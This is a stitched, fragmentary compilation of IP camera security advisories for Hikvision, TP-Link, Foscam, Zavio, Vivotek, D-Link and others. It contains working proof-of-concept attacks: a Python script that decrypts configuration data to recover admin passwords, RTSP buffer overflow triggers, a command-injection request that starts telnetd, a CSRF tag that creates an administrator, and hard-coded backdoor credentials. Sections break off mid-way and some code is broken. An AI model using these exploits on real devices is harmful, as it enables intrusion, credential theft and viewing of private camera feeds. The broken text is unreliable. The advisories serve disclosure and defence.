Dedicated Micros’ ground breaking Closed IPTV solution makes deploying an IP Video, CCTV system safe, secure and simple. Combining patent-pending innovation with zeroconf networking technology, Closed IPTV automatically allocates IP addresses to IP cameras by physical port. In this way the system is completely deterministic, creating firewalls and monitoring IP connections by individual network ports so they cannot be hacked or intercepted. This ground breaking solution provides a very simple and secure answer to IP Video, meaning that no prior knowledge of IP networking is required. Sophisticated and Dependable network security can be achieved with a single click.
4. Vulnerable Packages
- SD Advanced Closed IPTV
- SD Advanced
- EcoSense
- Digital Sprite 2
5. Technical Description
[1] Usually this directory can be protected against unauthenticated access (401 Unauthorized), though, it can access all files directly without requiring authentication.As in the statement below:
(401):  http://<target_ip>/hdd0/logs
(200): http://<target_ip>/hdd0/logs/log.txt
> Most common logfiles:
arc_log.txt
bak.txt
connect.txt
log.txt
seclog.log
startup.txt
DBGLOG.TXT
access.txt
security.txt
[2] Another problem identified is an information exposure via the parameter variable in variable.cgi script. Knowing some variables can extract a reasonable amount of information:
> DNS:
> ftp master ftp console credentials:
(although the vast majority of servers have ftp/telnet with anonymous access allowed.)
> alms
> camconfig
(includes, but is not limited to)
This servers also sends credentials (and other sensitive data) via GET parameters, this is poor practice as the URL is liable to be logged in any number of places between the customer and the camera. The credentials should be passed in the body of a POST request (under SSL of course, here is not the case). .  (Is possible to create, edit and delete users and other configurations in this way, very dangerous CSRF vectors).
6. Vendor Information, Solutions and Workarounds
The vendor found that some things are not vulnerabilities (sensitive information via GET, for example) and others are useless (hardcoded credentials) and others are not yet so critical (access to server logs).  I think that at least this information can assist during an intrusion test, as will be shown soon.
7. Credits
These vulnerabilities has been discovered by Orwelllabs.
8. Report Timeline
2015-08-31: Vendor has been notified about the vulnerabilities (without details yet).
2015-09-01: Vendor acknowledges the receipt of the email and asks for technical details.

Abstract Advisory Information:
The Vulnerability Laboratory Research Team discovered multiple web vulnerabilities in the official Private Camera Pro v5.0 iOS mobile web-application.
Vulnerability Disclosure Timeline:
2014-02-24:Public Disclosure (Vulnerability Laboratory)
Discovery Status:
Published
Affected Product(s):
Apple AppStore
Product: Private Camera Pro - iOS Web Application 5.0
Exploitation Technique:
Remote
Severity Level:
High
Technical Details & Description:
1.1
A local file include vulnerability has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests
or system specific path commands to compromise the web-application/device.
The vulnerability is located in the upload module of the mobile web-application web-interface. Remote attackers can
manipulate the `upload > submit` POST method request with the vulnerable `filename` value to compromise the application
or connected device components. The issue allows remote attackers to include local app path values or wifi web-server files.
The exploitation appears on the application-side and the inject request method is POST. The exection occurs in the main index
file dir list. The security risk of the local file include web vulnerability is estimated as high with a cvss (common vulnerability
scoring system) count of 7.2(+)|(-)7.3.
Exploitation of the local file include vulnerability requires no user interaction or privileged mobile application user account.
Successful exploitation of the file include web vulnerability results in mobile application compromise, connected device compromise
or web-server compromise.
Request Method(s):
[+] POST
Vulnerable Module(s):
[+] Upload (UI) & Import (Device Sync)
Vulnerable Parameter(s):
[+] filename
Affected Module(s):
[+] File Dir Index Listing
1.2
A local command/path injection web vulnerabilities has been discovered  in the official Private Camera Pro v5.0 iOS mobile web-application.
A command inject vulnerability allows attackers to inject local commands via vulnerable system values to compromise the apple mobile iOS application.
The vulnerability is located in the vulnerable `[devicename] (srvName)` value of the device-info module. Local attackers are able to inject own malicious
system specific commands or path value requests as the physical iOS hardware devicename. The execution of the injected command or path request occurs with
persistent attack vector in the device-info listing module of the web interface. The security risk of the local command/path inject vulnerability is estimated

Technical Details & Description:
1.1
A local file/path include web vulnerability has been discovered in the official WiFi Camera Roll v1.2 iOS mobile web-application.
The local file include web vulnerability allows remote attackers to unauthorized include local file/path requests or system
specific path commands to compromise the web-application or mobile device.
The local file include web vulnerability is located in the vulnerable `qqfile` name value of the `upload files` module (web-interface).
Remote attackers are able to inject own files with malicious filename to compromise the mobile application. The attack vector is
persistent and the request method is POST. The local file/path include execute occcurs in the main file index section after the refresh
of the file upload. The security risk of the local file include web vulnerability is estimated as high(+) with a cvss (common vulnerability
scoring system) count of 7.8(+)|(-)7.9.
Exploitation of the local file include web vulnerability requires no user interaction or privileged web-application user account with password.
Successful exploitation of the local web vulnerability results in mobile application or connected device component compromise by unauthorized
local file include web attacks.
Request Method(s):
[+] [POST]
Vulnerable Input(s):
[+] Upload Files
Vulnerable Parameter(s):
[+] filename > qqfile
Affected Module(s):
[+] Access from Computer (File Dir Index List - Folder/Category to  path=/)
1.2
An arbitrary file upload web vulnerability has been discovered in the official WiFi Camera Roll v1.2 iOS mobile web-application.
The arbitrary file upload issue allows remote attackers to upload files with multiple extensions to bypass the web-server or system validation.
The vulnerability is located in the `upload file` (video and images) module. Remote attackers are able to upload a php or js web-shells by renaming
the file with multiple extensions to bypass the file restriction mechanism. The attacker uploads for example a web-shell with the following name
and extension `image.gif.jpg.html.js.aspx.jpg`. After the upload the attacker needs to open the file in the web application. He deletes the .jpg &
.gif file extension and can access the application with elevated access rights. The security risk of the arbitrary file upload web vulnerability is
estimated as high with a cvss (common vulnerability scoring system) count of 6.4(+)|(-)6.5.
Exploitation of the arbitrary file upload web vulnerability requires no user interaction or privilege application user account with password.
Successful exploitation of the vulnerability results in unauthorized file access because of a compromise after the upload of web-shells.
Request Method(s):
[+] [POST]
Vulnerable Module(s):
[+] Upload (GUI)
Vulnerable Parameter(s):
[+] filename > qqfile (multiple extensions)
Affected Module(s):

None of the comunication atempts with the vendor received a response,
so I'm publishing the advisory to warn users and confirm the
vulnerability with you.
**Vulnerabilitty details**
The CSRF is present in the CGI formulary used to create and modify
users of the web interface of the camera (/set_users.cgi). This CSRF
would allow a malicious attacker to create users in the camera web
interface (including administrator users) if he is able to lure the
legitimate administrator of the camera to visit a web controlled by
the attacker.
An example of the process to exploit this vulnerability:
1- A webcam administrator is already logged in the camera web interface.
2- A malicious user knows it and send a link to this administrator
pointing to a web controlled by this attacker
(http://example.com/conceptronic_csrf.html). In this web, the attacker
placed an image with the following code:
<img alt=""csrf image""
src=""http://<victim_camera_server>/set_users.cgi?next_url=rebootme.htm&user1=attacker&pwd1=attacker&pri1=2&user2=&pwd2=&pri2=0&user3=&pwd3=&pri3=0&user4=&pwd4=&pri4=0&user5=&pwd5=&pri5=0&user6=&pwd6=&pri6=0&user7=&pwd7=&pri7=0&user8=&pwd8=&pri8=0"">
3- The webcam administrator visit the link.
4- The page http://example.com/test_csrf.html tries to load the image
by making a GET request to the pointed URL, thus, making the
legitimate administrator to create a new user identified by ""attacker""
and password ""attacker"".
A video was uploaded to youtube showing this behaviour:
This issue can be fixed by adding an additional step to the user
creation CGI, either requesting the administrator password again
before creating/modifying any user or creating a hidden random token
for each form (https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)

authentication and access the video stream.
4. *Vulnerable Packages*
. Vivotek IP cameras with firmware 0105a.
. Vivotek IP cameras with firmware 0105b.
. This vulnerability was tested against Vivotek IP cameras IP7160,
IP7361 and IP8332. Other Vivotek cameras and firmware are probably
affected too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
Vendor released the beta firmware 0301c [2] and notifies that it should
be the formal release [2013-10-28]; contact vendor for further
information. Some mitigation actions for this issue may be:
. Do not expose the camera to internet unless absolutely necessary.
. Filter RTSP traffic (default port 554) if possible.
6. *Credits*
This vulnerability was discovered and researched by Martin Di Paola from
Core Security QA Team. The PoC of was made by Martin Di Paola with help
of Martin Rocha from Core Development Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *RTSP Authentication Bypass*
This vulnerability is triggered by sending specially crafted RTSP
packets to remote TCP port 554. In order to run the proof of concept,
follow the next steps:
1. Set the camera RTSP authentication to 'basic'.
2. (Assuming that the camera is located in 192.168.1.1) Run 'poc.py'
with these parameters: 'python poc.py 9999 192.168.1.1 554'
3. Open a VLC media player and go to: 'Media > Open Network Stream'.
4. Enter the following network URL: 'rtsp://localhost:9999/live.sdp'.
5. A dialog box will asks for user/password, just click 'OK'.
6. You should see the RTSP live video stream; i.e., the RTSP basic
authentication can by bypassed by a remote attacker.

Hikvision IP Cameras Multiple Vulnerabilities
1. *Advisory Information*
Title: Hikvision IP Cameras Multiple Vulnerabilities
Advisory ID: CORE-2013-0708
Advisory URL:
Date published: 2013-08-06
Date of last update: 2013-08-06
Vendors contacted: Hikvision
Release mode: User release
2. *Vulnerability Information*
Class: Input validation error [CWE-20], Use of Hard-coded Credentials
[CWE-798], Buffer overflow [CWE-119]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-4975, CVE-2013-4976, CVE-2013-4977
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Hikvision IP camera
DS-2CD7153-E [1] (and potentially other cameras sharing the affected
firmware [2]) that could allow a remote attacker:
1. [CVE-2013-4975] To obtain the admin password from a non-privileged
user account.
2. [CVE-2013-4976] To bypass the anonymous user authentication using
hard-coded credentials (even if the built-in anonymous user account was
explicitly disabled).
3. [CVE-2013-4977] To execute arbitrary code without authentication
by exploiting a buffer overflow in the RTSP packet handler.
4. *Vulnerable Packages*
. Hikvision-DS-2CD7153-E IP camera with firmware v4.1.0 b130111 (Jan
2013).
. Other devices based on the same firmware [2] are probably affected
too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
There was no official answer from Hikvision after several attempts (see
[Sec. 8]); contact vendor for further information. Some mitigation
actions may be:
. Do not expose the camera to internet unless absolutely necessary.
. Have at least one proxy filtering HTTP requests to
'/PSIA/System/ConfigurationData'.
. Have at least one proxy filtering the 'Range' parameter in RTSP
requests.
6. *Credits*
. [CVE-2013-4975] was discovered and researched by Alberto Solino
from Core Security.
. [CVE-2013-4976] was discovered and researched by Alejandro
Rodriguez from Core Exploit QA Team.

by Anibal Sacco and Federico Muttis from Core Exploit Writers Team.
. The publication of this advisory was coordinated by Fernando
Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *Privilege Escalation through ConfigurationData Request*
[CVE-2013-4975] The following script allows obtaining the administrator
password by requesting the camera's configuration data and breaking its
trivial encryption. A valid user account is needed to launch the attack.
import urllib2
import base64
import argparse
import sys
def decrypt(config):
are
print '[*] Decrypting config'
key = config[-4:]
plaintext = ''
for i in range(len(config)/4):
for j in range(4):
plaintext += chr(ord(config[i*4+j]) ^ ord(key[j]))
return plaintext
def attack(target, username, password, output):
base_url = 'http://' + target + '/PSIA/System/ConfigurationData'
headers = { 'Authorization': 'Basic ' + base64.b64encode('%s:%s'
%(username,password)) }
print '[*] Attacking %s ' % target
req = urllib2.Request(base_url, None, headers)
try:
response = urllib2.urlopen(req)
config = response.read()
except Exception, e:
print e
return
plaintext = decrypt(config)
print '[*] Writing output file %s' % output
f = open(output, 'w')
f.write(plaintext)
f.close()
user = plaintext[0x45A0:0x45A0+32]
pwd  = plaintext[0x45C0:0x45C0+16]
print 'Probably the admin user is %s and the password is %s' %
(user, pwd)
print ""If it doesn't make any sense, just do a strings of the output
file""
if __name__ == '__main__':
parser = argparse.ArgumentParser()
parser.add_argument('target', action = 'store', help = 'target host
to attack')
parser.add_argument('username', action = 'store', help = 'username
to be used to authenticate against target')
parser.add_argument('password', action = 'store', help = ""username's
password"")
parser.add_argument('output', action = 'store', help = ""filename to
write the plaintext config"")
if len(sys.argv) == 1:
parser.print_help()
sys.exit(1)
options = parser.parse_args()
attack(options.target, options.username, options.password,
options.output)
7.2. *Anonymous User Authentication Bypass*
[CVE-2013-4976] The camera has a built-in anonymous account intended for
guest users, but even when the feature is disabled it could be bypassed
due to the usage of hardcoded credentials:
user: anonymous
password: \177\177\177\177\177\177
The bypass cannot be used directly through the login form but rather by
forging a cookie:
1. Load the login page to generate the initial cookies of the
camera's webapp.
2. Use your preferred tool (for example Firebug on Firefox) to create
a cookie with the name 'userInfoXX' (replace XX with the port where the
webserver is running i.e. 'userInfo80'), path '/' and value
'YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw=='; this is the tuple
'user:pass' encoded in base64 explained above.
3. Request the URI 'http:/<ipcam>/doc/pages/main.asp', a page that
should not be accessed without authentication if the anonymous user is
disabled.
There are several references to those hardcoded credentials in the cgis,
but in particular the following snippet was found in
'/doc/pages/scripts/login.js'::
107: function DoLogin(){
166:
$.cookie('userInfo'+m_lHttpPort,m_szUserPwdValue==""""?Base64.encode(""anonymous:\177\177\177\177\177\177""
):m_szUserPwdValue);
This bypass is not completely useful per se since all the interesting
requests are actually handled by the PSIA (Physical Security
Interoperability Alliance's) API. Nevertheless, if it is ever combined
with a privilege escalation it would allow remote attacker to control
the camera without proper credentials.
7.3. *Buffer Overflow in the RTSP Packet Handler*
[CVE-2013-4977] The following Python script sends a specially crafted
packet that triggers a buffer overrun condition when handling the
'Range' parameter of a RTSP transaction. As a result, the process
handling the communication crashes and the Watchdog service issues a
full restart. No authentication is required to exploit this
vulnerability and it would possible lead to a remote code execution.
import socket
HOST = '192.168.1.100'
PORT = 554
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
trigger_pkt =  ""PLAY rtsp://%s/ RTSP/1.0\r\n"" % HOST
trigger_pkt += ""CSeq: 7\r\n""
trigger_pkt += ""Range:
npt=Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9aLSaLSaLS\r\n""
trigger_pkt += ""User-Agent: VLC media player (LIVE555 Streaming Media
v2010.02.10)\r\n\r\n""
s.sendall(trigger_pkt)
print ""Packet sent""
data = s.recv(1024)
print 'Received', repr(data), ""\r\n""
s.close()

1. *Advisory Information*
Title: Multiple Vulnerabilities in TP-Link TL-SC3171 IP Cameras
Advisory ID: CORE-2013-0618
Advisory URL:
Date published: 2013-07-30
Date of last update: 2013-07-30
Vendors contacted: TP-Link
Release mode: Coordinated release
2. *Vulnerability Information*
Class: OS command injection [CWE-78], Use of hard-coded credentials
[CWE-798], Authentication Bypass Issues [CWE-592], Missing
Authentication for Critical Function [CWE-306]
Impact: Code execution, Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2578, CVE-2013-2579, CVE-2013-2580, CVE-2013-2581
3. *Vulnerability Description*
Multiple vulnerabilities have been found in TP-Link TL-SC3171 [1] IP
camera running firmware version LM.1.6.18P12_sign5 that could allow an
attacker:
1. [CVE-2013-2578] to execute arbitrary commands through the file
'/cgi-bin/admin/servetest'.
2. [CVE-2013-2579] to execute arbitrary commands in a shell using
hard-coded credentials.
3. [CVE-2013-2580] to perform unauthenticated remote file uploads.
5. [CVE-2013-2581] to perform unauthenticated remote firmware upgrades.
3.1. *Attack Paths*
There are several attack paths that can be exploited by combining these
vulnerabilities with other ones discovered by Eliezer Varade Lopez,
Javier Repiso Sanchez and Jonas Ropero Castillo [2]. Additional attack
paths are available, but the ones listed here allow understanding how an
attacker could compromise the affected device.
3.1.1. *Attack Path I*
(Authentication: none)
1. Upload a rooted firmware exploiting [CVE-2013-2581].
2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
3.1.2. *Attack Path II*
(Authentication: bypassed)
1. Reset the device to its factory defaults exploiting
'http://<ip-cam>/cgi-bin/hardfactorydefault'[2]. After this step, the
authentication can by bypassed by using 'admin:admin' as a valid
'username:password'.
2. Reboot the device by exploiting 'http://<ip-cam>/cgi-bin/reboot'[2].
3. Start the Telnet service exploiting [CVE-2013-2578].
4. Login to the Telnet service using user 'qmik' (no password)
[CVE-2013-2579], and use the device as a pivoting point.
4. *Vulnerable Packages*
Tests and PoC were run on:
. TP-Link TL-SC3171 IP camera running firmware version
LM.1.6.18P12_sign5.
. Other TP-Link cameras and firmware versions are probably affected
too, but they were not checked.
5. *Vendor Information, Solutions and Workarounds*
Vendor provides the links to (pre-release) patched firmware versions
[3]. The final official versions will be released in the next few days.
Please, contact TP-Link for further information.
6. *Credits*
These vulnerabilities were discovered by Flavio de Cristofaro and
researched with the help of Andres Blanco from Core Security
Technologies. The publication of this advisory was coordinated by
Fernando Miranda from Core Advisories Team.
7. *Technical Description / Proof of Concept Code*
7.1. *OS Command Injection in servetest*
[CVE-2013-2578] The file '/cgi-bin/admin/servetest' has an OS command
injection in several of its parameters that can be exploited by an
authenticated user to execute arbitrary commands. The following proof of
concept starts the telnetd service:
GET
/cgi-bin/admin/servetest?cmd=smtp&ServerName=1.1.1.1;/usr/sbin/telnetd;&ServerPort=25&ServerSSL=off&RcptToAddr1=q@q&AdminAddr=q@q
HTTP/1.1
Accept: */*
Accept-Language: en-us
Referer: http://192.168.1.100/progress.htm
If-Modified-Since: Sat, 1 Jan 2000 00:00:00 GMT
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64;

Proxy-Connection: Keep-Alive
Cookie: VideoFmt=1
Authorization: Basic YWRtaW46YWRtaW4=
Content-Length: 2
7.2. *Hard-coded credentials in telnet service*
[CVE-2013-2579] The affected system includes a hard-coded login with no
password which could be used by a remote attacker to access the OS of
the affected device using the built-in telnet service:
username: qmik
password: (none)
The 'qmik' user is allowed to execute the command 'su', allowing the
user to execute arbitrary commands with root level privileges. The
telnet service can be enabled through [CVE-2013-2578].
7.3. *Unauthenticated remote file uploads*
[CVE-2013-2580] The file '/cgi-bin/uploadfile' allows an unauthenticated
user to perform remote file uploads as shown in the following Python PoC:
import requests
fileName = ""lala.tmp""
f = open(fileName, ""w"")
f.write(""lala"")
f.close()
requests.post(""http://192.168.1.100/cgi-bin/uploadfile"",
files={fileName: open(fileName, ""rb"")})
The uploaded file (in this example lala.tmp) will be hosted in the
'/mnt/mtd' directory.
7.4. *Unauthenticated remote firmware upgrades*
[CVE-2013-2581] The file '/cgi-bin/firmwareupgrade' allows an
unauthenticated user to perform remote firmware upgrades as shown in the
following Python POC:
import requests
requests.get(""http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset"")
fileName = ""COM_T01F001_LM.1.6.18P12_sign5_TPL.TL-SC3171.bin""
cookies={""VideoFmt"":""1""}
requests.post(""http://192.168.1.100/cgi-bin/firmwareupgrade?action=preset"",
files={""SetFWFileName"" : (fileName, open(fileName, ""rb""))}, cookies=cookies)

FOSCAM IP-Cameras Improper Access Restrictions
1. *Advisory Information*
Title: FOSCAM IP-Cameras Improper Access Restrictions
Advisory ID: CORE-2013-0613
Advisory URL:
Date published: 2013-07-23
Date of last update: 2013-07-23
Vendors contacted: Foscam
Release mode: User release
2. *Vulnerability Information*
Class: Information Exposure [CWE-200]
Impact: Security bypass
Remotely Exploitable: Yes
Locally Exploitable: No
CVE Name: CVE-2013-2574
3. *Vulnerability Description*
Due to improper access restriction the FOSCAM FI8620 device [1] allows a
remote attacker to browse and access arbitrary files from the following
directories '/tmpfs/' and '/log/' without requiring authentication. This
could allow a remote attacker to obtain valuable information such as
access credentials, Wi-Fi configuration and other sensitive information
in plain text.
The list of affected files includes, but is not limited to, the following:
. 'http://<target_ip>/tmpfs/config_backup.bin'
. 'http://<target_ip>/tmpfs/config_restore.bin'
. 'http://<target_ip>/tmpfs/ddns.conf'
. 'http://<target_ip>/tmpfs/syslog.txt'
. 'http://<target_ip>/log/syslog.txt'
4. *Vulnerable Packages*
. FOSCAM FI8620 PTZ Camera.
. Other Foscam devices based on the same firmware are probably
affected too, but they were not checked.
5. *Non-Vulnerable Packages*
Vendor did not provide details. Contact Foscam for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Foscam after several attempts (see
[Sec. 9]); contact vendor for further information. Some mitigation
actions may be do not expose the camera to internet unless absolutely
necessary and have at least one proxy filtering HTTP requests to the
following resources:
. '/tmpfs/config_backup.bin'
. '/tmpfs/config_restore.bin'
. '/tmpfs/ddns.conf'
. '/tmpfs/syslog.txt'
. '/log/syslog.txt'
7. *Credits*
This vulnerability was discovered by Flavio de Cristofaro and researched
with the help of Andres Blanco from Core Security Technologies. The
publication of this advisory was coordinated by Fernando Miranda from
Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Accessing Manufacturer DDNS configuration*
By requesting the following URL using your default web browser:
you will see something like this:
[LoginInfo]
HostName=ddns.myfoscam.org
HostIP=113.105.65.47
Port=8080
UserName=<target username>
Password=<target plain password>
[Domain]
Domain=<target username>.myfoscam.org;
8.2. *Access Credentials Stored in Backup Files*
When a configuration backup is required by an operator/administrator,
the backup is generated in the local folder 'tmpfs' named as
'config_backup.bin'. The binary file is just a dump of the whole
configuration packed as Gzip and can be accessed by accessing the
following URL:
The presence of this temporary file enables an unauthenticated attacker
to download the configuration files which contain usernames, plaintext
passwords (including admin passwords), Wifi configuration including
plain PSK, among other interesting stuff as shown below:
username             = ""admin           ""
password             = ""admin           ""
authtype             = ""15              ""
authgroup            = ""                ""
[user1]
username             = ""user            ""
password             = ""user            ""
authtype             = ""3               ""
authgroup            = ""                ""
[user2]
username             = ""guest           ""
password             = ""guest           ""
authtype             = ""1               ""
authgroup            = ""                ""
It is important to mention that, in order to access the configuration
file previously mentioned, an operator and/or administrator should have
executed the backup process in advance.

CVE Name: CVE-2013-2567, CVE-2013-2568, CVE-2013-2569, CVE-2013-2570
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Zavio IP cameras based on
firmware v1.6.03 and below, that could allow an unauthenticated remote
attacker:
1. [CVE-2013-2567] to bypass user web interface authentication using
hard-coded credentials.
2. [CVE-2013-2568] to execute arbitrary commands from the
administration web interface. This flaw can also be used to obtain all
credentials of registered users.
3. [CVE-2013-2569] to access the camera video stream.
4. [CVE-2013-2570] to execute arbitrary commands from the
administration web interface (post authentication only).
4. *Vulnerable Packages*
. Zavio IP cameras based on firmware v1.6.03 and below.
. All tests and PoCs were run on Zavio F3105 [1] and F312A [2] IP
cameras only. Other Zavio cameras and firmware versions are probably
affected too, but they were not checked.
5. *Non-Vulnerable Packages*
. Vendor did not provide details. Contact Zavio for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Zavio after several attempts to report
these vulnerabilities (see [Sec. 9]). Contact vendor for further
information.
Some mitigation actions may be:
. Do not expose the camera to Internet unless absolutely necessary.
. Enable RTSP authentication.
. Have at least one proxy filtering HTTP requests to
'manufacture.cgi' and 'wireless_mft.cgi'.
. Check the parameter 'General.Time.NTP.Server' in requests to
'/opt/cgi/view/param'.
7. *Credits*
These vulnerabilities were discovered and researched by Nahuel Riva and
Francisco Falcon from Core Exploit Writers Team. The publication of this
advisory was coordinated by Fernando Miranda from Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Hard-Coded Credentials in Administrative Web Interface*
[CVE-2013-2567] Zavio IP cameras use the Boa web server [3], a popular
tiny server for embedded Linux devices. 'boa.conf' is the Boa
configuration file, and the following account can be found inside:
MFT manufacture erutcafunam
This account is not visible from the user web interface; users are not
aware of the existence and cannot eliminate it. Through this account it
is possible to access two CGI files located in '/cgi-bin/mft/':
1. 'manufacture.cgi'
2. 'wireless_mft.cgi'
The last file contains the OS command injection showed in the following
section.
8.2. *OS Command Injection*
[CVE-2013-2568] The file '/cgi-bin/mft/wireless_mft.cgi', has an OS
command injection in the parameter 'ap' that can be exploited using the
hard-coded credentials showed in the previous section:
username: manufacture
password: erutcafunam
The following proof of concept copies the file where the user
credentials are stored in the web server root directory:
Afterwards, the user credentials can be obtained by requesting:
8.3. *RTSP Authentication Disabled by Default*
[CVE-2013-2569] The RTSP protocol authentication is disabled by default.
Therefore, the live video stream can be accessed by a remote
unauthenticated attacker by requesting:
rtsp://192.168.1.100/video.h264
8.4. *OS Command Injection (Post-auth)*
[CVE-2013-2570] The command injection is located in the function
'sub_C8C8' of the binary '/opt/cgi/view/param'. The vulnerable parameter
is 'General.Time.NTP.Server'. The following proof of concept can be used
to obtain the complete list of access points by executing '/sbin/awpriv
ra0 get_site_survey':

CVE-2013-1598
3. *Vulnerability Description*
Multiple vulnerabilities have been found in Vivotek IP cameras [1] (and
potentially cameras from other vendors sharing the affected firmware)
that could allow an unauthenticated remote attacker:
1. [CVE-2013-1594] to process GET requests that contain sensitive
information,
2. [CVE-2013-1595] to execute arbitrary code,
3. [CVE-2013-1596] to access the video stream via RTSP,
4. [CVE-2013-1597] to dump the camera's memory and retrieve user
credentials,
5. [CVE-2013-1598] to execute arbitrary commands from the
administration web interface (pre-authentication with firmware 0300a and
post-authentication with firmware 0400a).
4. *Vulnerable Packages*
. Vivotek PT7135 IP camera with firmware 0300a.
. Vivotek PT7135 IP camera with firmware 0400a.
. Other Vivotek cameras/firmware are probably affected too, but they
were not checked.
5. *Non-Vulnerable Packages*
Vendor did not provide details. Contact Vivotek for further information.
6. *Vendor Information, Solutions and Workarounds*
There was no official answer from Vivotek after several attempts to
report these vulnerabilities (see [Sec. 9]). Contact vendor for further

to the binary 'farseer.out'.
7. *Credits*
[CVE-2013-1594] was originally discovered and reported [2] by Alejandro
Leon Morales [3] and re-discovered on new firmware versions by Flavio De
Cristofaro from Core Security.
[CVE-2013-1595] and [CVE-2013-1596] were discovered and researched by
Martin Rocha from Core Impact Pro Team. The PoC of [CVE-2013-1596] was
made by Martin Rocha with help of Juan Cotta from Core QA Team.
[CVE-2013-1597] and [CVE-2013-1598] were discovered and researched by
Francisco Falcon and Nahuel Riva from Core Exploit Writers Team.
The publication of this advisory was coordinated by Fernando Miranda
from Core Advisories Team.
8. *Technical Description / Proof of Concept Code*
8.1. *Information leak through GET request*
[CVE-2013-1594] Several Vivotek cameras store Wireless keys and 3rd
party credentials in clear text allowing a remote attacker to obtain
sensitive information which might be valuable to perform further
attacks. Sensitive information stored in plain text includes:
. FTP credentials
. Share folder credentials
. SMTP credentials
. WEP / WPA Keys
. DynDNS credentials
. Safe100.net credentials
. TZO credentials, among others.
The following GET requests can exploit the vulnerability (requests may
change according to firmware versions and vendors devices):
8.2. *Remote Buffer Overflow*
[CVE-2013-1595] The following Python script can be used to trigger the
vulnerability. This script will send to the RTSP service a specially
crafted packet with the header field 'Authorization' fully completed
with the character 'a' (0x61). As a result, the Instruction Pointer
register (IP) will be overwritten with 0x61616161, which is a typical
buffer overrun condition.
import socket, base64
cam_ip = '192.168.1.100'
session_descriptor = 'live.sdp'
request = 'DESCRIBE rtsp://%s/%s RTSP/1.0\r\n' % (cam_ip,
session_descriptor)
request+= 'CSeq: 1\r\n'
request+= 'Authorization: Basic %s\r\n'

s = socket.socket()
s.connect((cam_ip, 554))
print s.send(msg)
print s.recv(0x10000)
s.close()
8.3. *RTSP Authentication Bypass*
[CVE-2013-1596] This vulnerability is triggered by sending specially
crafted RTSP packets to remote TCP port 554 of a Vivotek PT7135 camera.
As a result, the video stream can be accessed by an unauthenticated
remote attacker.

8.4. *User Credentials Leaked via Path Traversal*
[CVE-2013-1597] The following Python code exploits a path traversal and
dumps the camera's memory. Valid user credentials can be extracted from
this memory dump by an unauthenticated remote attacker (firmware 0300a).
The same attack is still valid with firmware 0400a but the user has to
be authenticated in order to exploit this flaw.

7. *Technical Description / Proof of Concept Code*
7.1. *OS Command Injection*
[CVE-2013-1599] A security issue located in '/var/www/cgi-bin/rtpd.cgi'
allows an unauthenticated remote attacker to execute arbitrary commands
through the camera's web interface. The OS command injection is due to
this code in 'rtpd.cgi':
echo ""$QUERY_STRING"" | grep -vq ' ' || die ""query string cannot contain
spaces.""
. $conf > /dev/null 2> /dev/null
eval ""$(echo $QUERY_STRING | sed -e 's/&/ /g')""
The first line of this snippet basically ensures that there are no
spaces in '$QUERY_STRING'. The last line uses 'sed' to replace
ampersands '&' with spaces, and then call to the function 'eval()',
resulting in a typical command injection. For example, in order to execute:
uname -a;cat /etc/passwd
the following request can be sent to the camera web interface:
7.2. *Authentication Bypass*
[CVE-2013-1600] The live video stream can be accessed without
authentication by a remote attacker via the following request:
7.3. *ASCII Video Stream Information Leak*
[CVE-2013-1601] An ASCII output (the image luminance) of the live video
stream can be accessed by a remote unauthenticated attacker via:
The following example is the output of a coffee pot video stream [2]:

7.4. *RTSP Authentication Bypass*
[CVE-2013-1602] This vulnerability is triggered because:
1. Authentication is only present in DESCRIBE requests but not in
every subsequent request.
2. When the RTSP session is being established, the authentication
request of current session is ignored (a previously stored response is
used instead).
As a result, the video stream can be accessed by an unauthenticated
remote attacker.

7.5. *RTSP Hard-Coded Credentials*
[CVE-2013-1603] RTSP service contains hard-coded credentials that
effectively serve as a backdoor, which allows remote attackers to access
the RTSP video stream.
username: (any)
password: ?*
As we can see in the following dump, the submitted password is compared
with the string ':?*' (the character ':' is used for concatenation of
'username:password'). This code belongs to the binary 'rtspd':

# 'data' holds the content of the obfuscated configuration file","Unauthenticated remote access to D-Link DCS cameras
[ADVISORY INFORMATION]
Title:    Unauthenticated remote access to D-Link DCS cameras
Discovery date: 20/06/2012
Release date:   28/01/2013
Credits:        Roberto Paleari (roberto@greyhats.it, twitter: @rpaleari)
[VULNERABILITY INFORMATION]
Class:           Authentication bypass, Remote command execution
[AFFECTED PRODUCTS]
This security vulnerability affects the following products and firmware
versions:
* D-Link DCS-930L, firmware version 1.04
* D-Link DCS-932L, firmware version 1.02
Other products and firmware versions are probably also vulnerable, but they
were not checked.
[VULNERABILITY DETAILS]
D-Link DCS web cameras allow unauthenticated attackers to obtain the
configuration of the device remotely. A copy of the device configuration can be
obtained by accessing the following URL:
The obtained configuration file is obfuscated using a trivial obfuscation
scheme. Python code for the deobfuscation follows (sorry, the code is quite a
mess :-)):
<cut>
def deobfuscate(data):
r = []
for c in data:
c = ord(c)
c = (c + ord('y')) & 0xff
c = (c ^ ord('Z')) & 0xff
c = (c - ord('e')) & 0xff
r.append(c)
tmp = None
i = len(r) - 1
